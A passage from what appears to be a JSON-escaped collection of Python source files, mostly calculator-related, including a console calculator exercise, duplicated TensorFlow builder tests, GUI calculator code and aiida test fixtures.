\u0432\u044b\u0447\u0438\u0441\u043b\u0435\u043d\u0438\u0439.\n# \u0417\u0430\u0432\u0435\u0440\u0448\u0435\u043d\u0438\u0435 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u044b \u0434\u043e\u043b\u0436\u043d\u043e \u0432\u044b\u043f\u043e\u043b\u043d\u044f\u0442\u044c\u0441\u044f \u043f\u0440\u0438 \u0432\u0432\u043e\u0434\u0435 \u0441\u0438\u043c\u0432\u043e\u043b\u0430 '0' \u0432 \u043a\u0430\u0447\u0435\u0441\u0442\u0432\u0435 \u0437\u043d\u0430\u043a\u0430 \u043e\u043f\u0435\u0440\u0430\u0446\u0438\u0438.\n# \u0415\u0441\u043b\u0438 \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044c \u0432\u0432\u043e\u0434\u0438\u0442 \u043d\u0435\u0432\u0435\u0440\u043d\u044b\u0439 \u0437\u043d\u0430\u043a (\u043d\u0435 '0', '+', '-', '\u2605', '/'),\n# \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u0430 \u0434\u043e\u043b\u0436\u043d\u0430 \u0441\u043e\u043e\u0431\u0449\u0430\u0442\u044c \u0435\u043c\u0443 \u043e\u0431 \u043e\u0448\u0438\u0431\u043a\u0435 \u0438 \u0441\u043d\u043e\u0432\u0430 \u0437\u0430\u043f\u0440\u0430\u0448\u0438\u0432\u0430\u0442\u044c \u0437\u043d\u0430\u043a \u043e\u043f\u0435\u0440\u0430\u0446\u0438\u0438.\n# \u0422\u0430\u043a\u0436\u0435 \u0441\u043e\u043e\u0431\u0449\u0430\u0442\u044c \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044e \u043e \u043d\u0435\u0432\u043e\u0437\u043c\u043e\u0436\u043d\u043e\u0441\u0442\u0438 \u0434\u0435\u043b\u0435\u043d\u0438\u044f \u043d\u0430 \u043d\u043e\u043b\u044c, \u0435\u0441\u043b\u0438 \u043e\u043d \u0432\u0432\u0435\u043b 0 \u0432 \u043a\u0430\u0447\u0435\u0441\u0442\u0432\u0435 \u0434\u0435\u043b\u0438\u0442\u0435\u043b\u044f.\n\n\ndef calc(operation, x, y):\n    operations = {\n        '+': lambda a, b: a + b,\n        '-': lambda a, b: a - b,\n        '*': lambda a, b: a * b,\n        '/': lambda a, b: a / b,\n    }\n    return False if operation == '/' and y == 0 else operations[operation](x, y)\n\n\nwhile True:\n    sign = input(\"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043e\u043f\u0435\u0440\u0430\u0446\u0438\u044e('+', '-', '\u2605', '/') \u0438\u043b\u0438 \u0432\u044b\u0445\u043e\u0434('0'): \")\n    if sign == '0':\n        break\n    if sign not in ('+', '-', '*', '/', '0'):\n        print('\u041d\u0435\u0432\u0435\u0440\u043d\u0430\u044f \u043e\u043f\u0435\u0440\u0430\u0446\u0438\u044f')\n        continue\n    first = int(input(\"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043f\u0435\u0440\u0432\u044b\u0439 \u043e\u043f\u0435\u0440\u0430\u043d\u0434: \"))\n    while True:\n        second = int(input(\"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0432\u0442\u043e\u0440\u043e\u0439 \u043e\u043f\u0435\u0440\u0430\u043d\u0434: \"))\n        if sign == '/' and second == 0:\n            print('\u041d\u0430 \u043d\u043e\u043b\u044c \u0434\u0435\u043b\u0438\u0442\u044c \u043d\u0435\u043b\u044c\u0437\u044f')\n        else:\n            break\n    print('\u0420\u0435\u0437\u0443\u043b\u044c\u0442\u0430\u0442 \u043e\u043f\u0435\u0440\u0430\u0446\u0438\u0438 {} {} {} \u0440\u0430\u0432\u0435\u043d: {}'.format(first, sign, second, calc(sign, first, second)))\n\nassert calc('+', 0, 2) == 2\nassert calc('+', 1, 2) == 3\nassert calc('+', 1, 0) == 1\nassert calc('-', 0, 2) == -2\nassert calc('-', 0, 0) == 0\nassert calc('-', 1, 0) == 1\nassert calc('*', 1, 0) == 0\nassert calc('*', -1, 0) == 0\nassert calc('*', -1, -1) == 1\nassert calc('/', -1, -1) == 1\nassert not calc('/', -1, 0)\nassert calc('/', 8, 9) < 1\n\n", "560": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "561": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow.compat.v1 as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "562": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "563": "import pandas as pd\n# prop calc\nbuy = 10 # if buy > 5 - then 10 Bonus\nrent = 5 # if rent > 8 - then Add 10% to Total Base Price \nshort_trm = 2.5\n\n# dict_calc\ndict_calc = {}\ndict_calc[\"ls_buy\"] = []\ndict_calc[\"ls_rent\"] = []\ndict_calc[\"ls_shrt_trm\"] = []\n\ndef calc_input(p_rule = \" \"):\n    if p_rule == \"buy\":\n        dict_calc[\"ls_buy\"].append(10)\n        return dict_calc\n    elif p_rule == \"rent\":\n        dict_calc[\"ls_rent\"].append(5)\n        return dict_calc\n    elif p_rule == \"short_trm\":\n        dict_calc[\"ls_shrt_trm\"].append(2.5)\n        return dict_calc\n\nuserInput = input()#(rent)    \ndict_calc = calc_input(userInput)\nprint(\"--dict_calc-AA-\",dict_calc)\n\n\ndef calc_rules(dict_calc):\n    ls_buy = []\n    ls_rent = []\n    ls_a = []\n    #userInput = input()#(rent)    \n    #dict_calc = calc_input(userInput)\n    #print(\"--dict_calc-AA-\",dict_calc)\n    #if dict_calc:\n        \n    df = pd.DataFrame([dict_calc],columns=dict_calc.keys())\n    print(df)\n    #dfA = pd.DataFrame()\n    dfA = pd.concat([dfA, df], axis =0).reset_index()\n\n    #dfA = df.append(dict_calc, ignore_index=True)\n    print(dfA)\n    print(\"--BBBB----\")\n    return dfA\n\ndfA = calc_rules(dict_calc)\nprint(\"--AAAAA----\")\nprint(dfA)\n\n\n\n\n", "564": "import ethercalc\nimport logging\nimport script\n\ncalc_configs = script.get_calc_configs()\n\nif calc_configs:\n    if len(calc_configs) == 1:\n        calc_config = calc_configs[0]\n    else:\n        calc_names = []\n        for calc_config in calc_configs:\n            calc_names.append(calc_config['name'])\n        print(\"Calcs found: \"+script.semicolon_separated_list_from_python_list(any_list=calc_names))\n        calc_name = input(\"Enter the name of the calc (see list above) for which you want to unhide rows: \")\n        while calc_name not in calc_names:\n            calc_name = input(\"No calc with this name found. Try again: \")\n        calc_config = next((item for item in calc_configs if item[\"name\"] == calc_name), None)\n\n    script.set_calc_data(config=calc_config)\n    settings_list = script.load_ethercalc(sheet=5)\n    header_lines = script.find_header_lines(settings_list=settings_list)\n    print(\"header lines = \"+str(header_lines))\n\n    rows = input(\"Up to which row of \"+script.calc['name']+\"'s events table do you want to unhide? \")\n\n    e = ethercalc.EtherCalc(script.calc[\"host\"])\n    e.command(script.calc[\"page\"]+\".1\", [\"set \"+str(header_lines+1)+\":\"+str(rows)+\" hide\"])", "565": "\"\"\"\r\ntest calculator: use as an extended and embedded GUI component\r\n\"\"\"\r\n\r\nfrom tkinter import *\r\nfrom calculator import CalcGui\r\n\r\ndef calcContainer(parent=None):\r\n    frm = Frame(parent)\r\n    frm.pack(expand=YES, fill=BOTH)\r\n    Label(frm, text='Calc Container').pack(side=TOP)\r\n    CalcGui(frm)\r\n    Label(frm, text='Calc Container').pack(side=BOTTOM)\r\n    return frm\r\n\r\nclass calcSubclass(CalcGui):\r\n    def makeWidgets(self, fg, bg, font):\r\n        Label(self, text='Calc Subclass').pack(side=TOP)\r\n        Label(self, text='Calc Subclass').pack(side=BOTTOM)\r\n        CalcGui.makeWidgets(self, fg, bg, font)\r\n        #Label(self, text='Calc Subclass').pack(side=BOTTOM)\r\n\r\nif __name__ == '__main__':\r\n    import sys\r\n    if len(sys.argv) == 1:              # % calculator_test.py\r\n        root = Tk()                     # run 3 calcs in same process\r\n        CalcGui(Toplevel())             # each in a new toplevel window\r\n        calcContainer(Toplevel())\r\n        calcSubclass(Toplevel())\r\n        Button(root, text='quit', command=root.quit).pack()\r\n        root.mainloop()\r\n    if len(sys.argv) == 2:              # % calculator_testl.py -\r\n        CalcGui().mainloop()            # as a standalone window (default root)\r\n    elif len(sys.argv) == 3:            # % calculator_test.py - -\r\n        calcContainer().mainloop()      # as an embedded component\r\n    elif len(sys.argv) == 4:            # % calculator_test.py - - -\r\n        calcSubclass().mainloop()       # as a customized superclass\r\n", "566": "#-------------------------------------------------------------------------------\n# Name:        GraphSIDE\n# Author:      nebula121 \n# Copyright:   (c) nebula121 2018\n# Licence:     MIT License\n#-------------------------------------------------------------------------------\n\nimport sys\nfrom PySide.QtCore import *\nfrom PySide.QtGui import *\nfrom setting import Setting\n\nclass CalcDataSettingWidget(QDialog):\n    \n    def __init__(self, parent = None, dataSettingWidgetUi = None, dataSetSetting = {}):\n        super(CalcDataSettingWidget, self).__init__(parent)\n        \n        self.tempDataSetSetting = dataSetSetting\n        self.ui = dataSettingWidgetUi\n\n        self.ui.calcDataTreeWidget.currentItemChanged.connect(lambda: self.setupUiCalcDataDetail(self.ui.calcDataTreeWidget.currentItem()))\n\n        self.slot2 = lambda: self.setCalcDataSetting(name = self.ui.calcDataNameEdit.text(), \n                                                     firstCoefficient = self.ui.calcFirstDataCoefficientSpinBox.value(), \n                                                     firstDataIndex = self.ui.calcFirstDataComboBox.currentIndex(), \n                                                     operator = self.ui.operatorComboBox.currentText(), \n                                                     secondCoefficient = self.ui.calcSecondDataCoefficientSpinBox.value(), \n                                                     secondDataIndex = self.ui.calcSecondDataComboBox.currentIndex())\n        self.ui.calcDataNameEdit.textChanged.connect(self.slot2)\n        self.ui.calcFirstDataCoefficientSpinBox.valueChanged.connect(self.slot2)\n        self.ui.calcFirstDataComboBox.currentIndexChanged.connect(self.slot2)\n        self.ui.operatorComboBox.currentIndexChanged.connect(self.slot2)\n        self.ui.calcSecondDataCoefficientSpinBox.valueChanged.connect(self.slot2)\n        self.ui.calcSecondDataComboBox.currentIndexChanged.connect(self.slot2)\n        \n        self.ui.calcDataNewButton.clicked.connect(lambda: self.insertCalcDataSetting(index = self.ui.calcDataTreeWidget.indexOfTopLevelItem(self.ui.calcDataTreeWidget.currentItem())))\n        self.ui.calcDataCopyButton.clicked.connect(lambda: self.insertCalcDataSetting(index = self.ui.calcDataTreeWidget.indexOfTopLevelItem(self.ui.calcDataTreeWidget.currentItem()), \n                                                                                      calcDataProperty = self.ui.calcDataTreeWidget.currentItem().clone()))\n        self.ui.calcDataUpButton.clicked.connect(lambda: self.moveTreeWidgetItem(treeWidget = self.ui.calcDataTreeWidget, \n                                                                                 index = self.ui.calcDataTreeWidget.indexOfTopLevelItem(self.ui.calcDataTreeWidget.currentItem()), \n                                                                                 direction = -1))\n        self.ui.calcDataDownButton.clicked.connect(lambda: self.moveTreeWidgetItem(treeWidget = self.ui.calcDataTreeWidget, \n                                                                                   index = self.ui.calcDataTreeWidget.indexOfTopLevelItem(self.ui.calcDataTreeWidget.currentItem()), \n                                                                                   direction = +1))\n        self.ui.calcDataDeleteButton.clicked.connect(lambda: self.deleteShortcutSetting(treeWidget = self.ui.calcDataTreeWidget, \n                                                                                       index = self.ui.calcDataTreeWidget.indexOfTopLevelItem(self.ui.calcDataTreeWidget.currentItem())))\n\n\n    def setupUi(self):\n        self.ui.calcDataTreeWidget.setHeaderLabels([\"Name\", \"First Coefficient\", \"First Data (ID)\", \"Operator\", \"First Coefficient\", \"Second Data (ID)\", \"First Data\", \"Second Data\"])\n        self.ui.calcDataTreeWidget.setColumnHidden(1, True)\n        self.ui.calcDataTreeWidget.setColumnHidden(2, True)\n        self.ui.calcDataTreeWidget.setColumnHidden(4, True)\n        self.ui.calcDataTreeWidget.setColumnHidden(5, True)\n        header = self.ui.calcDataTreeWidget.header()\n        #header.moveSection(0, 0) # \"Name\" -> 0\n        header.moveSection(6, 1) # \"First Data\" -> 1\n        header.moveSection(4, 2) # \"Operator\" -> 2\n        header.moveSection(7, 3) # \"Second Data\" -> 3\n            \n        i = 0\n        while i < len(self.tempDataSetSetting[\"calcData\"]):\n            calcDataProperty = self.getCalcDataPropertyFromSetting(self.tempDataSetSetting[\"calcData\"][\"calcData\" + str(i + 1)])\n\n            self.ui.calcDataTreeWidget.addTopLevelItem(calcDataProperty)\n\n            i += 1\n        \n        self.updateCalcDataComboBox()\n        self.ui.operatorComboBox.addItems([\"+\", \"-\", \"\"])\n        \n        self.ui.calcFirstDataCoefficientSpinBox.setDecimals(6)\n        self.ui.calcSecondDataCoefficientSpinBox.setDecimals(6)\n        self.ui.calcFirstDataCoefficientSpinBox.setRange(-999999999999., 999999999999.)\n        self.ui.calcSecondDataCoefficientSpinBox.setRange(-999999999999., 999999999999.)\n\n            \n    def setupUiCalcDataDetail(self, calcDataProperty):\n        if calcDataProperty:\n            self.ui.calcDataNameEdit.textChanged.disconnect(self.slot2)\n            self.ui.calcFirstDataCoefficientSpinBox.valueChanged.disconnect(self.slot2)\n            self.ui.calcFirstDataComboBox.currentIndexChanged.disconnect(self.slot2)\n            self.ui.operatorComboBox.currentIndexChanged.disconnect(self.slot2)\n            self.ui.calcSecondDataCoefficientSpinBox.valueChanged.disconnect(self.slot2)\n            self.ui.calcSecondDataComboBox.currentIndexChanged.disconnect(self.slot2)\n\n            self.ui.calcDataNameEdit.setText(calcDataProperty.text(0))\n            self.ui.calcFirstDataCoefficientSpinBox.setValue(float(calcDataProperty.text(1)))\n            self.ui.calcFirstDataComboBox.setCurrentIndex(self.getDataIndex(calcDataProperty.text(2)))\n            self.ui.calcSecondDataCoefficientSpinBox.setValue(float(calcDataProperty.text(4)))\n            self.ui.calcSecondDataComboBox.setCurrentIndex(self.getDataIndex(calcDataProperty.text(5)))\n        \n            index = self.ui.operatorComboBox.findText(calcDataProperty.text(3))\n            self.ui.operatorComboBox.setCurrentIndex(index)\n           \n            self.ui.calcDataNameEdit.textChanged.connect(self.slot2)\n            self.ui.calcFirstDataCoefficientSpinBox.valueChanged.connect(self.slot2)\n            self.ui.calcFirstDataComboBox.currentIndexChanged.connect(self.slot2)\n            self.ui.operatorComboBox.currentIndexChanged.connect(self.slot2)\n            self.ui.calcSecondDataCoefficientSpinBox.valueChanged.connect(self.slot2)\n            self.ui.calcSecondDataComboBox.currentIndexChanged.connect(self.slot2)\n        \n\n    def setCalcDataSetting(self, name = \"\", firstCoefficient = 1.0, firstDataIndex = 0, operator = \"\", secondCoefficient = 1.0, secondDataIndex = 0):\n        if self.ui.calcDataTreeWidget.currentItem():\n            calcDataProperty = self.ui.calcDataTreeWidget.currentItem()\n\n            calcDataProperty.setText(0, name)\n            calcDataProperty.setText(1, str(firstCoefficient))\n            calcDataProperty.setText(2, self.getDataID(firstDataIndex))\n            calcDataProperty.setText(3, operator)\n            calcDataProperty.setText(4, str(secondCoefficient))\n            calcDataProperty.setText(5, self.getDataID(secondDataIndex))\n            calcDataProperty.setText(6, self.getDataNameList()[firstDataIndex])\n            calcDataProperty.setText(7, self.getDataNameList()[secondDataIndex])\n\n    \n    def getCalcDataPropertyFromSetting(self, calcDataSetting = Setting().getInitSettings()[\"dataSet\"][\"dataSet1\"][\"calcData\"][\"calcData1\"]):\n        calcDataProperty = QTreeWidgetItem([\"\"])\n        calcDataProperty.setText(0, calcDataSetting[\"name\"])\n        calcDataProperty.setText(1, str(calcDataSetting[\"firstCoefficient\"]))\n        calcDataProperty.setText(2, calcDataSetting[\"firstData\"])\n        calcDataProperty.setText(3, calcDataSetting[\"operator\"])\n        calcDataProperty.setText(4, str(calcDataSetting[\"secondCoefficient\"]))\n        calcDataProperty.setText(5, calcDataSetting[\"secondData\"])\n        calcDataProperty.setText(6, self.getDataNameList()[self.getDataIndex(calcDataSetting[\"firstData\"])])\n        calcDataProperty.setText(7, self.getDataNameList()[self.getDataIndex(calcDataSetting[\"secondData\"])])\n\n        return calcDataProperty\n\n\n    def getDataNameList(self):#############\n        dataNameList = list()\n        \n        dataNameList.append(\"Default data 1: Data index\")\n        dataNameList.append(\"Default data 2: 1 (Constant num)\")\n        \n        i = 0\n        while i < self.ui.rawDataTreeWidget.topLevelItemCount():\n            dataNameList.append(\"Raw data \" + str(i + 1) + \": \" + self.ui.rawDataTreeWidget.topLevelItem(i).text(1))\n            i += 1\n\n        return dataNameList\n\n\n    def getDataIndex(self, dataID):\n        defaultDataNum = 2\n        rawDataNum = len(self.tempDataSetSetting[\"rawData\"])##############\n        calcDataNum = len(self.tempDataSetSetting[\"calcData\"])############\n\n        if dataID[0] == \"d\":\n            return int(dataID[1:]) - 1\n        elif dataID[0] == \"r\":\n            return defaultDataNum + int(dataID[1:]) - 1\n        elif dataID[0] == \"c\":\n            return defaultDataNum + rawDataNum + int(dataID[1:]) - 1\n\n\n    def getDataID(self, dataIndex):\n        defaultDataNum = 2\n        rawDataNum = len(self.tempDataSetSetting[\"rawData\"])###############\n        calcDataNum = len(self.tempDataSetSetting[\"calcData\"])#############\n\n        if dataIndex <= 1:\n            return \"d\" + str(dataIndex + 1)\n        elif dataIndex <= rawDataNum + 1:\n            return \"r\" + str(dataIndex - defaultDataNum + 1)\n        elif dataIndex <= rawDataNum + calcDataNum + 1:\n            return \"c\" + str(dataIndex - defaultDataNum - rawDataNum + 1)\n\n\n    def updateCalcDataComboBox(self):\n        dataNameList = self.getDataNameList()\n\n        if self.ui.calcFirstDataComboBox.currentIndex() != -1:\n            calcFirstDataComboBoxIndex = self.ui.calcFirstDataComboBox.currentIndex()\n        else:\n            calcFirstDataComboBoxIndex = 0\n        if self.ui.calcSecondDataComboBox.currentIndex() != -1:\n            calcSecondDataComboBoxIndex = self.ui.calcSecondDataComboBox.currentIndex()\n        else:\n            calcSecondDataComboBoxIndex = 0\n\n        self.ui.calcFirstDataComboBox.clear()\n        self.ui.calcSecondDataComboBox.clear()\n        \n        i = 0\n        while i < len(dataNameList):\n            self.ui.calcFirstDataComboBox.addItem(dataNameList[i])\n            self.ui.calcSecondDataComboBox.addItem(dataNameList[i])\n            i += 1\n\n        self.ui.calcFirstDataComboBox.setCurrentIndex(calcFirstDataComboBoxIndex)\n        self.ui.calcSecondDataComboBox.setCurrentIndex(calcSecondDataComboBoxIndex)\n\n\n    def insertCalcDataSetting(self, index = -1, calcDataProperty = None):\n        if calcDataProperty is None:\n            calcDataProperty = self.getCalcDataPropertyFromSetting()\n\n        if index != -1:\n            self.ui.calcDataTreeWidget.insertTopLevelItem(index + 1, calcDataProperty)\n        else:\n            self.ui.calcDataTreeWidget.addTopLevelItem(calcDataProperty)\n\n\n    def moveTreeWidgetItem(self, treeWidget = None, index = 0, direction = 0):\n        if treeWidget is None:\n            return\n        if index == 0 and direction == -1:\n            return\n        if index == treeWidget.topLevelItemCount() - 1 and direction == +1:\n            return\n\n        item = treeWidget.takeTopLevelItem(index)\n        treeWidget.insertTopLevelItem(index + direction, item)\n        treeWidget.setCurrentItem(item)\n\n        if treeWidget is self.ui.rawDataTreeWidget:\n            self.updateRawDataTreeWidgetIndexNum()\n\n\n    def deleteShortcutSetting(self, treeWidget = None, index = -1):\n        item = treeWidget.takeTopLevelItem(index)\n        del item\n\n        \n    def getCurrentCalcDataSetting(self):\n        calcDataSetting = dict()\n\n        i = 0\n        while i < self.ui.calcDataTreeWidget.topLevelItemCount():\n            calcDataSetting[\"calcData\" + str(i + 1)] = {}\n            calcDataSetting[\"calcData\" + str(i + 1)][\"name\"] = self.ui.calcDataTreeWidget.topLevelItem(i).text(0)\n            calcDataSetting[\"calcData\" + str(i + 1)][\"firstCoefficient\"] = float(self.ui.calcDataTreeWidget.topLevelItem(i).text(1))\n            calcDataSetting[\"calcData\" + str(i + 1)][\"firstData\"] = self.ui.calcDataTreeWidget.topLevelItem(i).text(2)\n            calcDataSetting[\"calcData\" + str(i + 1)][\"operator\"] = self.ui.calcDataTreeWidget.topLevelItem(i).text(3)\n            calcDataSetting[\"calcData\" + str(i + 1)][\"secondCoefficient\"] = float(self.ui.calcDataTreeWidget.topLevelItem(i).text(4))\n            calcDataSetting[\"calcData\" + str(i + 1)][\"secondData\"] = self.ui.calcDataTreeWidget.topLevelItem(i).text(5)\n\n            i += 1\n\n        return calcDataSetting", "567": "#  Copyright (c)  Andrey Sobolev, 2019. Distributed under MIT license, see LICENSE file.\n\nimport os\nimport shutil\nimport tempfile\nimport pytest\nfrom ase.spacegroup import crystal\n\n\n@pytest.fixture\ndef crystal_calc(test_crystal_code, crystal_calc_parameters, test_structure_data, test_basis_family_predefined):\n    from aiida.common.extendeddicts import AttributeDict\n    from aiida.orm import Bool\n    from aiida_crystal_dft.calculations.serial import CrystalSerialCalculation\n\n    inputs = AttributeDict()\n    inputs.metadata = AttributeDict({'options':\n                                     {'resources':\n                                      {\"num_machines\": 1, \"num_mpiprocs_per_machine\": 1}\n                                      }\n                                     })\n    inputs.code = test_crystal_code\n    inputs.structure = test_structure_data\n    inputs.parameters = crystal_calc_parameters\n    inputs.basis_family = test_basis_family_predefined\n    inputs.guess_oxistates = Bool(False)\n    inputs.high_spin_preferred = Bool(False)\n    inputs.is_magnetic = Bool(True)\n    calc = CrystalSerialCalculation(inputs)\n    return calc\n\n\n@pytest.fixture\ndef calc_results():\n    from aiida.orm import FolderData\n    from aiida_crystal_dft.tests import TEST_DIR\n\n    def get_results(files=None, prefix=\"mgo_sto3g\"):\n        \"\"\"\n        Return a FolderData with the results of the calculation\n        :param files: a dictionary corresponding files to directories\n        :param prefix: a folder with all output files for the test calculation\n        :return: a FolderData instance\n        \"\"\"\n        data = FolderData()\n        if files is None:\n            files = {}\n        # copy files from prefix\n        root_dir = os.path.join(TEST_DIR, 'output_files', prefix)\n        for entry in os.listdir(root_dir):\n            if os.path.isfile(os.path.join(root_dir, entry)):\n                # non-default file location\n                if entry in files:\n                    file_dir = os.path.join(TEST_DIR, 'output_files', files[entry])\n                    with open(os.path.join(file_dir, entry), 'rb') as f:\n                        data.put_object_from_filelike(f, entry, mode='wb')\n                    continue\n                # default file location\n                with open(os.path.join(root_dir, entry), 'rb') as f:\n                    data.put_object_from_filelike(f, entry, mode='wb')\n        return data\n\n    return get_results\n\n\n@pytest.fixture\ndef crystal_calc_node(crystal_calc, calc_results):\n    \"\"\"Returns CalcJobNode corresponding to CrystalCalc CalcJob\"\"\"\n    from aiida.orm import CalcJobNode\n    from aiida.common.links import LinkType\n\n    def get_calcnode(files=None, prefix=\"mgo_sto3g\"):\n        computer = crystal_calc.inputs.code.get_remote_computer()\n        process_type = 'aiida.calculations:{}'.format('crystal_dft.serial')\n        node = CalcJobNode(computer=computer, process_type=process_type)\n        node.set_process_label('CrystalSerialCalculation')\n        node.set_attribute('input_filename', 'INPUT')\n        node.set_attribute('output_filename', 'crystal.out')\n        node.set_option('resources', {'num_machines': 1, 'num_mpiprocs_per_machine': 1})\n        node.add_incoming(crystal_calc.inputs.code, link_type=LinkType.INPUT_CALC, link_label='code')\n        node.add_incoming(crystal_calc.inputs.structure, link_type=LinkType.INPUT_CALC, link_label='structure')\n        node.add_incoming(crystal_calc.inputs.parameters, link_type=LinkType.INPUT_CALC, link_label='parameters')\n        